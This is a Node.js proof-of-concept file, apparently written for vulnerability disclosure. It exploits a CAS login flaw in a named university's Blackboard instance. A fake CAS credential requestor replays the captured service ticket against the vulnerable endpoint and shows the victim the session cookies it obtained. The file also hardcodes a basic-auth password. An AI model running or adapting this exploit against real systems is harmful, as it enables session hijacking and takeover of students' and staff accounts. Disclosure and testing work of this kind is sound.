const crypto = require('crypto')
const Koa = require('koa')
const session = require('koa-session')
const FakeCas = require('./lib/fake-cas')
// The koa-basic-auth module is used purely to protect this POC from being used
// by unauthorized test users.
const auth = require('koa-basic-auth')

const CAS_SERVER = 'https://login.uconn.edu'
const BLACKBOARD_INSTANCE = 'https://lms.uconn.edu'
const VULNERABLE_ENDPOINT = `/webapps/bb-auth-provider-cas-BB5849b9bae4172/execute/casLogin?cmd=login&authProviderId=_102_1&redirectUrl=${encodeURIComponent(BLACKBOARD_INSTANCE)}%2Fwebapps%2Fportal%2Fexecute%2FdefaultTab&globalLogoutEnabled=true`

const POC_APP_USERNAME = 'i-accept-that-my-login-will-be-spoofed-for-testing'
const POC_APP_PASSWORD = 'eJmDKRbhxStkhF3MfamBJ1mscEWSBQHv8uLLJeaV'

const app = new Koa()

app.keys = [crypto.randomBytes(256)]
app.use(session(app))

app.use(auth({ name: POC_APP_USERNAME, pass: POC_APP_PASSWORD }))

const cas = FakeCas({
  service: ctx => `${ctx.protocol}://${ctx.host}${VULNERABLE_ENDPOINT}`,
  server: CAS_SERVER
})

app.use(cas.fakeCredentialRequestor({
  attackUrl: ticket =>
    BLACKBOARD_INSTANCE +
    VULNERABLE_ENDPOINT +
    '&ticket=' + ticket
}))

app.use(async ctx => {
  ctx.body = `If I was a bad person, I would use the following cookies to login as you into ${BLACKBOARD_INSTANCE}.\n\n` +
    ctx.session.cookieString
  ctx.session = null
})

app.listen(3000)
